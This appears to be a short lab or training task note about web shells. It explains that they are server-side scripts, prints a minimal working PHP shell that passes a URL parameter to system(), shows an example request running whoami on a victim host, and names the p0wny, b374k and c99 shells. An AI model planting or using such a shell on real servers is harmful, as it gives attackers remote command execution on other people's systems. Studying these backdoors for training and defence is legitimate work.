## Task 7 Web Shell

Objective: Understand web shells and their use cases.
Web shells are scripts written in languages supported by web servers (PHP, ASP, JSP, CGI).
Example PHP Web Shell:
php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
Access via URL:
Code
- http://victim.com/uploads/shell.php?cmd=whoami
Popular Web Shells:
p0wny-shell → minimalistic PHP shell.
b374k shell → feature-rich with file management.
c99 shell → robust with extensive functionality.

